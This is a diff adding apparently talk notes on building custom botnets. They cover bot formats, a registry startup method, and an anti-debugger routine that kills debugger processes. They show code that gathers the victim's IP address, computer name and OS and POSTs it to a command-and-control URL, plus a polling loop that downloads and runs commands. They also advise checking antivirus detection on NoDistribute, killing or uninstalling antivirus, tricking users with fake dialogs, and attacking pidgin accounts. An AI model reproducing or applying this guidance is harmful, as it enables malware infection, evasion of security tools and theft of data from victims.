@@ -1,0 +1,94 @@
+Bot formats:
+http bots (generic webserver where controls done via web interction)
+irc bot (controlled via irc, command line only)
+
+Language:
+c++ (no dependencies, efficient)
+c# (ubiqutous and easier to run it with, nothing wrong with it)
+
+Fundamental Aspects About Botnets
+- patterns
+- default configs
+- update ability
+- ability to be silent
+- buyers or people are inevitably stupid
+
+patterns in malware: 
+default config: either gotta have an installer (no default password) or random password generation
+update: going to be bugs, exploits
+silent: problems getting infections cuz people will uninstall it
+
+why custom botnets?
+no need for updates
+easy bug & security fixes
+researchers start from scratch
+minimize detection and classification of being called 'malicious'
+
+Tools of the trade
+virtual machines
+brain
+experience
+
+Feature Check List
+anti-vm
+anti-sandbox
+anti-debugger
+startup keys
+checking processes
+
+not covered:
+l33t zer0 days
+advanced botnet features
+
+How he did it:
+
+startup method:
+-move file to a new file
+-modify windows registry
+-now it works on startup!
+-make it works on windows notify \& run
+
+anti-debugger: (to slow down researchers)
+\$process = "ImmunityDebugger.exe"
+if ProcessExists(\$process) then:
+    processclose(\$process)
+endif
+
+Information Gathering
+\$ip = @IPAddress1 
+\$name = @ComputerName
+\$os = @OSVersion
+
+Send Back Home
+\$serverData = 'ip=' \& ip \& 'computer=' \& \$name \& 'os=' \& \$os
+\$OHttp = ObjCreate("winhttp.winhttprequest.5.1")
+\$OHttp.open("POST", "http://192.168.1.2/work/opbotnet/accept.php", False)
+\$OHttp.SetRequestHeader....
+\$OHttp.Send(\$serverData)
+
+Every piece of malware has a while loop to phone back home periodically
+while 1 {
+    \$command = InetRead("http://192.168.1.2/work/opbotnet/command.php")
+    \$process = BinaryToString(\$command)
+    \$commandValue = split(\$process, ".")
+    if \$commandValue[1] == "dl" then
+        // download the command to execute to a certain directory
+        ShellExecute(the program)
+    end
+    sleep 10000
+}
+
+Finally you put it on "NoDistribute" and check if any of the antiviruses already detect it.
+
+Making it even better
+
+Anti-anti-virus
+- write a function called avcheck that checks whether anti viruses are there
+- you can check the registry or you can check directories under Program files.  the latter is less malicious and the former can run into problems.
+- then you can try uninstalling anti-virus or killing the process
+- for admin privileges, you could pop up a magic box with the logo on it and trick the user into uninstalling it himself
+- avenue of attack kind of depends on the antivirus; deleting registry first is nicer but sometimes risky
+
+
+Things you can attack
+-pidgin accounts
